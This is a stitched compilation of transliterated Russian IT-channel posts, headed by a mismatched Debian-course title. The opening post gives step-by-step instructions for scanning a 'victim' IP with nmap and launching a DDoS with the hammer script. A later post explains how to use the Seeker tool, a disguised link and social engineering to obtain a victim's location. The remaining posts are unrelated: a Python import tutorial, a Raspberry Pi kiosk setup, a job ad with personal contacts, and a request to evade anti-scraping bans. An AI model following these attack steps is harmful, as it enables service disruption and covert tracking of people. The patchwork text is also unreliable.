Stat'ia iz kursa po Debian 10. Nauchimsia uznavat', chto zanimaet mesto na zhestkom diske vashego servera    #Debian@linux_windows_net  #Linux@linux_windows_net  #SistemnoeAdministrirovanie@linux_windows_net  #KursyIT@linux_windows_net

Diskleimer: Stat'ia predostavlena v oznakomitel'nykh tseliakh! My ne pobuzhdaem povtoriat' vse deistviia. Ni sozdatel', ni telegramm kanal otvetstvennosti za vas ne nesiot!  Segodnia my uznaem chto mozhno sdelat', poluchiv chei-libo IP adres. Priiatnogo chteniia!    1) Opredeliaem primernoe mestopolozhenie po IP.  Zakhodim na sait - https://www.iptrackeronline.com/    Po defoltu tam stoit vash IP adres. Vvodite tuda liuboi IP i poluchaete primernoe mestopolozhenie na karte.    2) Uznaem provaidera po IP.  Zakhodim na sait - https://www.infobyip.com/    Tam takzhe stoit vash IP. Vvodite zhelaemyi adres i poluchaete provaidera pervoi zhe strochkoi.    Imia provaidera nakhoditsia v kolonke ISP.    3) Uznaem operatsionnuiu sistemu po IP.  Chtoby eto sdelat', nado zaiti na etot zhe sait - https://www.infobyip.com/    Takzhe visyvaem nuzhnyi IP i spuskaemsia vniz do vkladki Client Properties.    Tut ishchem Operating system afyvfyv i vidim sprava ot nee operatsionnuiu sistemu.    A takzhe tut mozhno uvidet' razreshenie ekrana pol'zovatelia.    4) Nakhodim otkrytye porty IP adresa.  Kak vy uzhe naverno dogadalis' my budem ispol'zovat' utilitu NMAP. Ona uzhe predustanovlena v Kali Linux i Parrot OS.    Snachala otkryvaem terminal i prosim rut dostup    sudo su  Esli ponadobitsia parol', vpishite svoi, libo toor    Teper' razberemsia s temi parametrami kotorye nam ponadobiatsia    Vy mozhete vvesti takuiu komandu i poluchit' pomoshch' po rabote s utilitoi.    nmap --help  Zdes' nas interesuet chast' SCAN TECHNIQUES, a imenno parametry -sT i -sU.    -sT nuzhen dlia skanirovaniia TCP portov.    -sU nuzhen dlia skanirovaniia UDP portov    Poluchaem vot takuiu komandu:    nmap -sT -sU 127.0.0.1  Skanirovanie mozhet dlitsia dovol'no dolgo, no vy mozhete uznavat' progress skana. Dlia etogo prosto nazhimaite Enter    V itoge poluchaete vse otkrytye TCP i UDP porty.    5) Zapuskaem DDOS ataku na IP adres.  Chtoby zaddosit' IP, nam ponadobitsia te zhe Kali ili Parrot.    Snachala skloniruem repozitorii    git clone https://github.com/cyweb/hammer.git  A seichas obnovim repozitorii i ustanovim svezhuiu versiiu Python 3    apt update  apt upgrade  apt install python3  Teper' pereidem v katalog skripta    cd hammer/  Zapustim skript:    python3 hammer.py -h  Dlia nachala razberem parametry skripta:    -h pokazyvaet okno pomoshchi (Kak my uzhe zapustili)    -s siuda vvodim IP zhertvy    -p vybiraem po kakomu portu ddosit'    -t eto zaprosy v sekundu. Chem bol'she postavite, tem bystree budut otsylat'sia pakety, odnako esli ukazhete bol'she 250-300, skript mozhet i vovse na srabotat'. Poetomu rekomenduiu stavit' ot nulia do 220.    Poluchaem takuiu komandu    python3 hammer.py -s 127.0.0.1 -p 80 -t 200  Vot i vse. Nadeius', stat'ia byla dlia vas polezna!

Vyshel novyi stabil'nyi reliz populiarnogo iazyka programmirovaniia Python. Python - vysokourovnevyi iazyk programmirovaniia obshchego naznacheniia, orientirovannyi na povyshenie proizvoditel'nosti razrabotchika i chitaemosti koda. Osnovnye cherty - dinamicheskaia tipizatsiia, avtomaticheskoe upravlenie pamiat'iu, polnaia introspektsiia, mekhanizm obrabotki iskliuchenii, podderzhka mnogopotochnykh vychislenii, vysokourovnevye struktury dannykh. Python - stabil'nyi i rasprostranionnyi iazyk. On ispol'zuetsia vo mnogikh proektakh i v razlichnykh kachestvakh: kak osnovnoi iazyk programmirovaniia ili dlia sozdaniia rasshirenii i integratsii prilozhenii. Osnovnye oblasti primeneniia: veb-razrabotka, mashinnoe obuchenie i analiz dannykh, avtomatizatsiia i sistemnoe administrirovanie. V nastoiashchii moment Python zanimaet tret'e mesto v reitinge TIOBE. ( chitat' dal'she... )                      development, python, python3

Sistemnyi razrabotchik (Middle - Senior) v IDEKO (ideco.ru) / ot 120 000 do 180 000 rub.  Kompaniia <<Aideko>> - razrabotchik programmnogo obespecheniia v oblasti informatsionnoi bezopasnosti i setevykh tekhnologii.    Obiazannosti:   - Razrabotka mikroservisov pod Linux s ispol'zovaniem Asyncio i AioHTTP   - Razrabotka demonov na Python3 po avtomatizatsii nastroek sistemy;   - Razrabotka demonov na Python3 po nastroike i upravleniiu set'iu;   - Napisanie sistemnykh utilit na Python3;   - Proektirovanie arkhitektury sistemy i bakendov, refaktoring.    Trebovaniia:   - Opyt kommercheskoi razrabotki ot 3-kh let;  - Opyt raboty s setevym stekom iadra Linux (iptables, iproute2);  - Navyki administrirovaniia Linux (squid, dnsmasq, strongswan, nginx, ppp i dr).  - Opyt raboty s Docker;  - Opyt razrabotki c NoSQL bazami dannykh (u nas Etcd);  - Opyt raboty s virtualizatsiei (qemu).  - Opyt proektirovaniia REST-API.   Budet pliusom:   - Opyt napisaniia iunit testov;  - Znanie\opyt raboty s kernel bypass, zerocopy, XDP;  - Opyt razrabotki na C/C++ ili Golang.   Usloviia:   - Proektnaia rabota;   - Udobnyi grafik raboty, vozmozhna udalennaia rabota;  - Rabota v komande professionalov;  - Besplatnoe obuchenie angliiskomu iazyku s prepodavatelem (v ofise libo udalenno);  - Vozmozhnost' razvivat'sia v professional'noi srede. Sotrudniki postoianno prokhodiat treningi (vneshnee i vnutrennee).  Otkliknut'sia: Manakova Anastasiia  +7 (982) 7460647  manakova@skydns.ru

Ne sekret, chto zelenye druz'ia raspolzlis' po podokonnikam mnogikh iz nas, vot i mne zakhotelos' vyrastit' u sebia chto-nibud'. Da ne prosto <<chto-nibud'>>, a chto-nibud' plodonosiashchee. K sozhaleniiu, v kvartirnykh usloviiakh obespechit' neobkhodimye dlia etogo usloviia ves'ma neprosto. Odnako popytat'sia stoit. Tak, i vzbrela mne v golovu mysl' razrabotki ustroistva dlia resheniia etoi zadachi -- umnogo grouboksa. Konechno, ideia ne nova, no naiti chto-nibud' interesnoe, da eshche i nastol'nogo formata sredi gotovoi produktsii mne ne udalos' i zakhotelos' soorudit' koe-chto svoio. Delo doshlo do versii 2.0 i vot, ia gotov podelit'sia poluchennymi rezul'tatami.

Privet, Khabr!    Khochetsia podelit'sia opytom nastroiki Raspberry Pi 3B+ v kachestve kioska s GUI na baze biblioteki Kivy dlia Python 3. Pochemu imenno Kivy? Prosto my uzhe imeem produkt, razrabotannyi na Python, nam by khotelos' dobavit' k nemu graficheskii interfeis. Stoit otmetit', chto do Kivy my pereprobovali neskol'ko variantov, vkliuchaia wxWidgets i dazhe brauzer na Chromium s veb-prilozheniem. Vse eti al'ternativy okazalis' bessil'ny protiv Kivy, liogkoi i bystroi. Ochen' khoroshii obzor etoi biblioteki uzhe est' na Khabre.    Okruzhenie    My budem ispol'zovat' Raspbian Lite s Python 3.7 i sistemoi upravleniia protsessami i servisami Supervisor. Kstati, ochen' udobnoi iavliaetsia utilitka Raspberry Pi Imager, s pomoshch'iu kotoroi mozhno podgotovit' SD-kartochku. Posle pervoi zagruzki nashego malysha RPi loginimsia s pomoshch'iu standartnogo logina pi i parolia raspberry. Dalee vypolniaem:    $ sudo raspi-config      Vybiraem piatyi punkt Interfacing Options, v poiavivshemsia meniu nas interesuet vtoroi punkt SSH, s pomoshch'iu kotorogo my vkliuchim udalionnyi dostup dlia udobstva.  Itak, udobno otkinuvshis' v liubimom kresle, prodolzhim nastroiku RPi cherez liuboi udobnyi ssh-klient.    Pol'zovatel'    Davaite sozdadim pol'zovatelia s udobnym dlia nas imenem, razreshim emu pol'zovat'sia sudo i perezagruzimsia:    $ sudo useradd -m kivygui -s /bin/bash  $ sudo passwd kivygui  $ sudo usermod -a -G sudo kivygui  $ sudo reboot      Posle perezagruzki zaloginimsia cherez ssh uzhe s novymi dannymi dlia kivygui i udalim standartnuiu uchiotku pi:    $ sudo userdel pi  $ sudo rm -r /home/pi/      Ne lishnim budet ukazat', chto my pol'zuemsia amerikanskoi raskladkoi klaviatury:    $ sudo sed -i 's/XKBLAYOUT="gb"/XKBLAYOUT="us"/' /etc/default/keyboard      Testovoe prilozhenie    Nashe testovoe prilozhenie budet nakhodit'sia v otdel'noi papke, sozdadim eio:    $ mkdir /home/kivygui/helloworld      Teper' davaite v tekstovom redaktore nano sozdadim skript dlia zapuska Python-prilozheniia /home/kivygui/helloworld/run.sh so sleduiushchim soderzhimym:    export DISPLAY=:0.0  xset s off -dpms  exec matchbox-window-manager &  while true; do   exec python3 start.py  done      Sdelaem v nano i primer prosten'kogo interfeisa v faile /home/kivygui/helloworld/start.py:    import kivy  kivy.require('1.11.0')  from kivy.app import App  from kivy.uix.label import Label  class MyApp(App):   def build(self):   return Label(text='Hello, world!')  if __name__ == '__main__':   MyApp().run()      Graficheskii pol'zovatel'skii interfeis    Nam ponadobitsia pip3:    $ sudo apt-get update -y  $ sudo apt-get install -y python3-pip      Takzhe ia stalkivalsia s tem, chto pri ustanovke nodm ne vsegda zagruzhalis' vse neobkhodimye pakety, poetomu na vsiakii sluchai ustanovim ikh zaranee:    $ sudo apt-get install -y desktop-base gtk2-engines-pixbuf libxklavier16 xserver-xorg xserver-xorg-input-all xserver-xorg-input-libinput xserver-xorg-input-wacom xserver-xorg-legacy xserver-xorg-video-all xserver-xorg-video-amdgpu xserver-xorg-video-ati xserver-xorg-video-fbdev xserver-xorg-video-nouveau xserver-xorg-video-radeon xserver-xorg-video-vesa      Teper' davaite ustanovim nodm i okonnyi menedzher matchbox:    $ sudo DEBIAN_FRONTEND=noninteractive DEBCONF_NONINTERACTIVE_SEEN=true apt-get install -y x11-xserver-utils nodm matchbox-window-manager  $ echo "/usr/sbin/nodm" | sudo tee /etc/X11/default-display-manager  $ sudo sed -i -e "s/NODM_ENABLED=false/NODM_ENABLED=true/" -e "s/NODM_USER=root/NODM_USER=kivygui/" -e "s/NODM_X_OPTIONS='-nolisten tcp'/NODM_X_OPTIONS='-nolisten tcp -nocursor'/" /etc/default/nodm      Nastal cheriod Kivy:    $ sudo apt-get install -y libsdl2-dev libsdl2-image-dev libsdl2-mixer-dev libsdl2-ttf-dev pkg-config libgl1-mesa-dev libgles2-mesa-dev python-setuptools libgstreamer1.0-dev git-core gstreamer1.0-plugins-{bad,base,good,ugly} gstreamer1.0-{omx,alsa} python-dev libmtdev-dev xclip xsel libjpeg-dev  $ sudo python3 -m pip install --user kivy      Teper' nauchim nashu sistemu pokazyvat' nam graficheskii interfeis vmesto konsol'nogo priglasheniia, skroem vse diagnosticheskie soobshcheniia i pokazhem graficheskii ekran zagruzki sistemy:    $ sudo rm /etc/systemd/system/default.target  $ sudo rm /etc/systemd/system/getty@tty1.service.d/autologin.conf  $ sudo ln -s /lib/systemd/system/graphical.target /etc/systemd/system/default.target  $ sudo sed -i '$ s/$/ quiet splash consoleblank=0 loglevel=0 logo.nologo plymouth.ignore-serial-consoles/' /boot/cmdline.txt  $ sudo sed -i 's/console=tty1/console=tty3/' /boot/cmdline.txt      Esli est' zhelanie, konsol' tty1 voobshche mozhno otkliuchit':    $ sudo systemctl disable getty@tty1      Supervisord    Teper' davaite ustanovim Supervisor:    $ sudo apt-get install -y supervisor      Sozdadim papku dlia logov:    $ mkdir /home/kivygui/logs      Teper' davaite nenadolgo ostanovim sluzhbu Supervisor dlia perekonfiguratsii:    $ sudo systemctl stop supervisor      Dobavim s pomoshch'iu redaktora nano v kofiguratsionnyi fail /etc/supervisor/supervisord.conf sleduiushchee:    [program:rungui]  command=sh run.sh  directory=/home/kivygui/helloworld  user=root  autostart=true  autorestart=true  startsecs = 5  startretries=3  stderr_logfile=/home/kivygui/logs/rungui.err.log  stdout_logfile=/home/kivygui/logs/rungui.out.log  stderr_logfile_maxbytes=5MB  stdout_logfile_maxbytes=5MB  stopsignal=INT  stopwaitsecs=5      Takzhe davaite dadim pol'zovateliam kivygui i root dopolnitel'nye vozmozhnosti. Dlia etogo vospol'zuemsia komandoi:    $ sudo visudo      Privediom fail k sleduiushchemu vidu:    #  # This file MUST be edited with the 'visudo' command as root.  #  # Please consider adding local content in /etc/sudoers.d/ instead of  # directly modifying this file.  #  # See the man page for details on how to write a sudoers file.  #  Defaults env_reset  Defaults mail_badpass  Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"    # Host alias specification    # User alias specification    # Cmnd alias specification    # User privilege specification  root ALL=(ALL:ALL) ALL  kivygui ALL=(ALL:ALL) ALL    # Allow members of group sudo to execute any command  %sudo ALL=(ALL:ALL) ALL    # See sudoers(5) for more information on "#include" directives:    #includedir /etc/sudoers.d    kivygui ALL = NOPASSWD: /usr/bin/supervisorctl  kivygui ALL = NOPASSWD: /usr/bin/python3.7  kivygui ALL=(ALL) NOPASSWD: /bin/systemctl daemon-reload  kivygui ALL=(ALL) NOPASSWD: /usr/bin/supervisord    root ALL=(ALL) NOPASSWD: /bin/systemctl daemon-reload  root ALL = NOPASSWD: /usr/bin/supervisorctl  root ALL = NOPASSWD: /usr/bin/python3.7  root ALL=(ALL) NOPASSWD: /usr/bin/supervisord      Teper' my mozhem zapuskat' sluzhbu:    $ sudo systemctl start supervisor      Na podkliuchennom k RPi monitore my uvidim zavetnoe privetstvie. Ostalos' tol'ko perezagruzit'sia, chtoby proverit' rabotu graficheskogo ekrana zagruzki.https://habr.com/ru/post/516542/

Uznaiom mestopolozhenie cheloveka ili kak rabotaet Seeker?  On razmeshchaet poddel'nyi veb-sait na Apache Server i ispol'zuet Ngrok , kotoraia zaprashivaet razreshenie na razmeshchenie, i esli pol'zovatel' ee razreshaet. my mozhem poluchit':  Nariadu s informatsiei o mestopolozhenii my takzhe mozhem poluchit' informatsiiu ob ustroistve bez kakikh-libo razreshenii:  Ustanovka  git clone https://github.com/thewhiteh4t/seeker.git cd seeker/ chmod 777 install.sh ./install.sh  Docker  curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh  docker build -t seeker .  docker run -t --rm seeker docker pull thewhiteh4t/seeker docker run -t seeker  Ispol'zovanie python3 seeker.py -h python3 seeker.py --subdomain google  Zapusk python seeker.py Kopiruem poluchennuiu ssylku.  Otpravliaemsia na liuboi portal dlia sokrashcheniia ssylok.  Naprimer https://bitly.com/  Sokrashchaem ssylku dlia togo chto by ona byla menee palevnoi.  Teper' zhertva perekhodit po sgenerirovannoi ssylke i razreshaet dostup k geolokatsii.  Na etom etape vse zavisit ot vashego navyka SI.  Posle togo kak zhertva nazhmet na volshebnuiu knopku, vy poluchite dannye o ego mestopolozhenii.

Problema est' s saitom rebuy.de - raz v nedeliu sait zapuskaet analiz vsekh zaprosov i vidit, chto byla zagruzhena tol'ko informatsiia s api, bez zagruzok html,css,js, kartinok i vsiu podset' proksi banit tselikom. Probovali raznye proksi, dazhe vrashchaiushchiesia s pulami IP 5 millionov - vse ravno baniat.   Kak variant resheniia vysheopisannoi problemy, mozhet byt' uiti ot API(tak kak ispol'zuia API skryt' chto-to nereal'no) i ispol'zovat' headless brauzery dlia parsinga.  Ili liubuiu druguiu tekhnologiiu/metod - otkryt k obsuzhdeniiu i predlozheniiam!   Glavnaia tsel' - dostich' skorosti stabil'nogo parsinga 400-500 tovarov/minuta na oboikh saitakh pri vmeniaemoi stoimosti proksi - ne bolee 100$/mesiats. Seichas ispol'zuiutsia statichnye proksi(10 potokov), parsit medlenno, no ne banit. Kogda stavliu vyshe 10 potokov - banit vse srazu s kontse nedeli.  https://freelancehunt.com/project/parser-python3/760154.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

Import v Python: chast' 2  Sistema importa Python  My videli mnogo preimushchestv sistemy importa Python i sposobov ikh ispol'zovaniia. V etoi stat'e my pripodnimem zavesu nad tem, chto proiskhodit pri importe modulei i paketov.  Kak i mnogoe v Python, sistemu importa mozhno nastraivat'. My uvidim neskol'ko sposobov izmeneniia sistemy importa, v tom chisle avtomaticheskuiu zagruzku nedostaiushchikh paketov iz PyPI i import failov dannykh, kak esli by oni byli moduliami.  Import soderzhimogo modulei  Sistema importa Python podrobno opisana v ofitsial'noi dokumentatsii. Vot chto proiskhodit na vysokom urovne pri importe modulia (ili paketa). Modul':   Ishchetsia.Zagruzhaetsia.Priviazyvaetsia k prostranstvu imion. Dlia obychnykh importov, vypolniaemykh s pomoshch'iu operatora import, vse tri punkta proiskhodiat avtomaticheski. A vot pri ispol'zovanii importlib avtomaticheski srabatyvaiut tol'ko pervye dva. Priviazyvat' modul' k peremennoi ili prostranstvu imion pridiotsia samostoiatel'no.  Naprimer, sleduiushchie sposoby importirovaniia i pereimenovaniia math.pi primerno ekvivalentny:   >>> from math import pi as PI >>> PI 3.141592653589793>>> import importlib >>> _tmp = importlib.import_module("math") >>> PI = _tmp.pi >>> del _tmp >>> PI 3.141592653589793 Konechno, v obychnom kode vy by otdali predpochtenie pervomu.  Sleduet otmetit', chto dazhe esli iz modulia importiruetsia tol'ko odin atribut, to zagruzhaetsia i vypolniaetsia ves' modul'. Ostal'noe soderzhimoe modulia prosto ne priviazano k tekushchemu prostranstvu imion. Chtoby dokazat' eto, obratimsia k keshu modulei:   >>> from math import pi >>> pi 3.141592653589793>>> import sys >>> sys.modules["math"].cos(pi) -1.0 sys.modules -- eto i est' kesh modulei. On soderzhit ssylki na vse importirovannye moduli.  Kesh modulei igraet ochen' vazhnuiu rol' v sisteme importa Python. Imenno zdes', v sys.modules, prezhde chem gde-libo eshchio, Python ishchet moduli pri vypolnenii importa. Esli modul' uzhe dostupen, to on ne zagruzhaetsia snova.  Eto ne tol'ko otlichnaia optimizatsiia, no i neobkhodimost'. Esli by moduli pri kazhdom importirovanii zagruzhalis' zanovo, to v nekotorykh situatsiiakh mogli by vozniknut' nesootvetstviia (naprimer, kogda imeiushchiisia iskhodnyi kod meniaetsia vo vremia vypolneniia skripta).  Vspomnite put' importa, kotoryi vy rassmatrivali ranee, v pervoi stat'e. Fakticheski on soobshchaet Python, gde iskat' moduli. No esli Python nakhodit modul' v keshe modulei, to on ne stanet utruzhdat' sebia poiskom puti importa dlia etogo modulia.  Primer: singltony v kachestve modulei  V ob'ektno-orientirovannom programmirovanii singlton -- eto klass, imeiushchii ne bolee odnogo ekzempliara. I khotia my mozhem realizovat' singltony v Python, bol'shinstvo sluchaev khoroshego ispol'zovaniia singltonov sviazano s moduliami. My mozhem doverit' keshu modulei instantsirovanie klassa tol'ko odin raz.  V kachestve primera vernemsia k demograficheskim dannym Organizatsii Ob'edinennykh Natsii, kotorye my uzhe rassmatrivali ranee, v pervoi stat'e. Sleduiushchii modul' opredeliaet klass, obiortyvaiushchii dannye o naselenii:   # population.pyimport csv from importlib import resourcesimport matplotlib.pyplot as pltclass _Population:  def __init__(self):  """Read the population file""" (Schityvaet fail s demograficheskimi dannymi)  self.data = {}  self.variant = "Medium" print(f"Reading population data for {self.variant} scenario")  with resources.open_text(  "data", "WPP2019_TotalPopulationBySex.csv"  ) as fid:  rows = csv.DictReader(fid) # Schityvanie dannykh, otbor dannykh po zadannomu variantu  for row in rows:  if int(row["LocID"]) >= 900 or row["Variant"] != self.variant:  continue country = self.data.setdefault(row["Location"], {})  population = float(row["PopTotal"]) * 1000  country[int(row["Time"])] = round(population) def get_country(self, country):  """Get population data for one country""" (Poluchaet demograficheskie dannye dlia odnoi strany)  data = self.data[country]  years, population = zip(*data.items())  return years, populationdef plot_country(self, country):  """Plot data for one country, population in millions""" (Dannye dlia odnoi strany izobrazhaiutsia na grafike, naselenie v millionakh)  years, population = self.get_country(country)  plt.plot(years, [p / 1e6 for p in population], label=country)def order_countries(self, year):  """Sort countries by population in decreasing order""" (Sortiruet strany po naseleniiu v poriadke ubyvaniia)  countries = {c: self.data[c][year] for c in self.data}  return sorted(countries, key=lambda c: countries[c], reverse=True)# Instantsirovanie singltona data = _Population() Chtenie dannykh s diska zanimaet nekotoroe vremia. My ne ozhidaem, chto fail dannykh izmenitsia, poetomu instantsiruem klass pri zagruzke modulia. Nazvanie klassa nachinaetsia s podcherkivaniia dlia ukazaniia na to, chto ego ne sleduet ispol'zovat'.  My mozhem zadeistvovat' singlton population.data dlia sozdaniia diagrammy Matplotlib, illiustriruiushchei demograficheskii prognoz dlia stran s naibol'shei chislennost'iu naseleniia:   >>> import matplotlib.pyplot as plt >>> import population Reading population data for Medium scenario>>> # Vyberite piat' stran s naibol'shei chislennost'iu naseleniia v 2050 godu >>> for country in population.data.order_countries(2050)[:5]: ... population.data.plot_country(country) ... >>> plt.legend() >>> plt.xlabel("Year") >>> plt.ylabel("Population [Millions]") >>> plt.title("UN Population Projections") >>> plt.show() Sozdaiotsia takoi grafik:  Obratite vnimanie, chto zagruzka dannykh vo vremia importa -- eto svoego roda antipattern. V ideale zhelatel'no, chtoby import byl maksimal'no svoboden ot pobochnykh effektov. Luchshim podkhodom byla by lenivaia zagruzka dannykh, t.e. zagruzhat' ikh po mere neobkhodimosti. Eto mozhet poluchat'sia dovol'no elegantno, esli my zadeistvuem svoistva. Primer togo, kak eto delaetsia, mozhete uvidet' nizhe.  Lenivaia realizatsiia population sokhraniaet demograficheskie dannye v ._data v moment, kogda oni vpervye schityvaiutsia. Svoistvo .data rabotaet s etim keshirovaniem dannykh:   # population.pyimport csv from importlib import resourcesimport matplotlib.pyplot as pltclass _Population:  def __init__(self):  """Prepare to read the population file""" (Podgotovka k schityvaniiu faila s demograficheskimi dannymi)  self._data = {}  self.variant = "Medium" [id5144984|@property]  def data(self):  """Read data from disk""" (Schityvaet dannye s diska)  if self._data: # Dannye uzhe schitany, vozvrashchaet ikh priamo  return self._data # Schityvaet dannye i sokhraniaet ikh v self._data  print(f"Reading population data for {self.variant} scenario")  with resources.open_text(  "data", "WPP2019_TotalPopulationBySex.csv"  ) as fid:  rows = csv.DictReader(fid) # Schityvanie dannykh, otbor dannykh po zadannomu variantu  for row in rows:  if int(row["LocID"]) >= 900 or row["Variant"] != self.variant:  continue country = self._data.setdefault(row["Location"], {})  population = float(row["PopTotal"]) * 1000  country[int(row["Time"])] = round(population)  return self._data def get_country(self, country):  """Get population data for one country"""  country = self.data[country]  years, population = zip(*country.items())  return years, population def plot_country(self, country):  """Plot data for one country, population in millions"""  years, population = self.get_country(country)  plt.plot(years, [p / 1e6 for p in population], label=country) def order_countries(self, year):  """Sort countries by population in decreasing order"""  countries = {c: self.data[c][year] for c in self.data}  return sorted(countries, key=lambda c: countries[c], reverse=True)# Instantsirovanie singltona data = _Population()   Povtornaia zagruzka modulei  Kesh modulei mozhet byt' neskol'ko neudobnym, kogda vy rabotaete v interaktivnom interpretatore. Ne tak prosto perezagruzit' modul' posle ego izmeneniia. Rassmotrim, naprimer, sleduiushchii modul':   # number.pyanswer = 24 Vypolniaia testirovanie i otladku etogo modulia, importiruem ego v konsol' Python:   >>> import number >>> number.answer 24 Dopustim, my nashli oshibku v kode, poetomu obnovliaem fail number.py v redaktore:   # number.pyanswer = 42 Vernuvshis' v konsol', importiruem obnovlennyi modul', chtoby uvidet', chto poluchilos' posle ispravleniia oshibki:   >>> import number >>> number.answer 24 Pochemu otvet vsio tot zhe: 24? Kesh modulei delaet svoiu (teper' dostavliaiushchuiu nekotorye neudobstva) rabotu: Python uzhe importiroval ranee number, poetomu on ne vidit prichin zagruzhat' etot modul' snova, dazhe esli v nego tol'ko chto vnesli izmeneniia.  Samoe prostoe reshenie zdes' -- vyiti iz konsoli Python i perezapustit' eio. Eto zastavit Python ochistit' svoi kesh modulei:   >>> import number >>> number.answer 42 Odnako perezapusk interpretatora ne vsegda vozmozhen. Veroiatno, vinoi tomu bolee slozhnaia sessiia, na nastroiku kotoroi mozhet uiti mnogo vremeni. V etom sluchae dlia perezagruzki modulia mozhno ispol'zovat' importlib.reload():   >>> import number >>> number.answer 24>>> # Obnovliaem number.py v redaktore>>> import importlib >>> importlib.reload(number) <module 'number' from 'number.py'>>>> number.answer 42 Obratite vnimanie, chto ob'ekta modulia trebuet reload(), a ne stroka tipa import_module(). Krome togo, u reload() est' koe-kakie niuansy. V chastnosti: peremennye, ssylaiushchiesia na ob'ekty vnutri modulia, ne priviazyvaiutsia povtorno k novym ob'ektam pri perezagruzke etogo modulia. S podrobnostiami mozhno oznakomit'sia v dokumentatsii.  Sredstva poiska i zagruzchiki  My uzhe videli, chto sozdanie modulei s temi zhe imenami, chto i standartnye biblioteki, mozhet privodit' k problemam. Naprimer, esli u nas v puti importa Python est' fail s imenem math.py, my ne smozhem importirovat' math iz standartnoi biblioteki.  No eto ne vsegda tak. Sozdadim fail s imenem time.py i takim soderzhimym:   # time.pyprint("Now's the time!") Zatem otkroem interpretator Python i importiruem etot novyi modul':   >>> import time >>> # Nichego ne vyvoditsia>>> time.ctime() 'Mon Jun 15 14:26:12 2020'>>> time.tzname ('CET', 'CEST') No tut chto-to strannoe sluchilos'. Pokhozhe, Python ne importiroval nash novyi modul' time. Vmesto nego byl importirovan modul' time iz standartnoi biblioteki. Pochemu standartnye bibliotechnye moduli vedut sebia neposledovatel'no? Otvetit' na etot vopros my smozhem, vnimatel'no rassmotrev moduli:   >>> import math >>> math <module 'math' from '.../python/lib/python3.8/lib-dynload/math.cpython.so'>>>> import time >>> time <module 'time' (built-in)> Modul' math importiruetsia iz faila, a vot time -- eto uzhe vstroennyi modul'. Kazhetsia, vstroennye moduli ne zateniaiutsia lokal'nymi.  Primechanie: vstroennye moduli kompiliruiutsia v interpretator Python. Eto v osnovnom bazovye moduli, takie kak builtins, sys i time. Kakie imenno moduli vstroennye, zavisit ot interpretatora Python. Ikh imena mozhno naiti v sys.builtin_module_names.  Davaite eshchio bol'she uglubimsia v sistemu importa Python, a zaodno razberiomsia, pochemu vstroennye moduli ne zateniaiutsia lokal'nymi. Importirovanie modulia prokhodit v tri etapa:   Python proveriaet, dostupen li modul' v keshe modulei. Esli sys.modules prisutstvuet imia etogo modulia, to eto znachit, chto modul' uzhe dostupen i protsess importa zavershaetsia.Python nachinaet iskat' modul' s pomoshch'iu sredstv poiska. Sredstvo poiska ishchet modul', ispol'zuia zadannuiu strategiiu. Standartnye sredstva poiska mogut importirovat' vstroennye moduli, zamorozhennye moduli i moduli, nakhodiashchiesia v puti importa.Python zagruzhaet modul' s pomoshch'iu zagruzchika. Kakoi imenno zagruzchik ispol'zuetsia v Python? Eto opredeliaetsia sredstvom poiska, kotoroe nakhodit modul'. Zagruzchik ukazyvaetsia v module spec. Vy mozhete rasshirit' sistemu importa Python, vnedriv svoio sobstvennoe sredstvo poiska i pri neobkhodimosti -- sobstvennyi zagruzchik. Pozzhe my uvidim primer ispol'zovaniia takogo sredstva poiska. A poka chto nauchimsia delat' bazovye (i sovsem prosten'kie) personal'nye nastroiki sistemy importa.  sys.meta_path upravliaet tem, kakie sredstva poiska vyzyvaiutsia v protsesse importa:   >>> import sys >>> sys.meta_path [<class '_frozen_importlib.BuiltinImporter'>,  <class '_frozen_importlib.FrozenImporter'>,  <class '_frozen_importlib_external.PathFinder'>] Stoit obratit' vnimanie na dva obstoiatel'stva. Vo-pervykh, zdes' daiotsia otvet na postavlennyi ranee vopros: vstroennye moduli ne zateniaiutsia lokal'nymi moduliami, potomu chto vstroennoe sredstvo poiska vyzyvaetsia do sredstva poiska puti importa, kotoroe nakhodit lokal'nye moduli. Vo-vtorykh, est' vozmozhnost' nastroit' sys.meta_path tak, kak vam nuzhno.  Vnesiom nemnogo nerazberikhi v nash seans raboty v Python. Dlia etogo udalim vse sredstva poiska:   >>> import sys >>> sys.meta_path.clear() >>> sys.meta_path []>>> import math Traceback (most recent call last):  File "<stdin>", line 1, in <module> ModuleNotFoundError: No module named 'math'>>> import importlib # Avtomaticheski importirovan pri zapuske, nakhoditsia vsio eshchio v keshe modulia >>> importlib <module 'importlib' from '.../python/lib/python3.8/importlib/__init__.py'> Sredstv poiska ne ostalos', poetomu Python ne mozhet naiti ili importirovat' novye moduli. No u Python ostaiotsia vozmozhnost' importirovat' te moduli, kotorye uzhe nakhodiatsia v keshe modulei. On zagliadyvaet tuda, prezhde chem vyzyvat' sredstva poiska.  V privedionnom vyshe primere importlib byl zagruzhen uzhe do togo, kak my ubrali sredstva poiska. Teper' sdelaem nash seans raboty v Python polnost'iu neprigodnym. Dlia etogo ochistim takzhe i kesh modulia sys.modules.  Dalee privediom bolee poleznyi primer. Napishem sredstvo poiska, kotoroe vyvedet na konsol' soobshchenie, identifitsiruiushchee importiruemyi modul'. V etom primere pokazano, kak dobavit' sobstvennoe sredstvo poiska, pust' i fakticheski bez popytok naiti modul':   # debug_importer.pyimport sysclass DebugFinder:  [id29436710|@classmethod]  def find_spec(cls, name, path, target=None):  print(f"Importing {name!r}")  return Nonesys.meta_path.insert(0, DebugFinder) Vse sredstva poiska dolzhny realizovyvat' metod klassa .find_spec(), pytaiushchiisia naiti dannyi modul'. Est' tri sposoba zaversheniia metoda .find_spec():   S vozvrashcheniem None, esli on ne znaet, kak naiti i zagruzit' modul'.S vozvrashcheniem module spec, ukazyvaiushchim na to, kak zagruzit' modul'.S vydachei oshibki ModuleNotFoundError, ukazyvaiushchei na to, chto modul' ne mozhet byt' importirovan. DebugFinder vyvodit na konsol' soobshchenie, a zatem iavnym obrazom vozvrashchaet None, fakticheski ostavliaia import modulia drugim sredstvam poiska.  Obratite vnimanie: Python neiavno vozvrashchaet None iz liuboi funktsii ili metoda (ne ukazyvaia return), poetomu strochku 9 mozhno opustit'. No v dannom sluchae my vkliuchaem return None, davaia poniat', chto DebugFinder ne nakhodit modul'.  Vstaviv DebugFinder pervym v spisok sredstv poiska, poluchaem rabochii spisok vsekh importiruemykh modulei:   >>> import debug_importer >>> import csv Importing 'csv' Importing 're' Importing 'enum' Importing 'sre_compile' Importing '_sre' Importing 'sre_parse' Importing 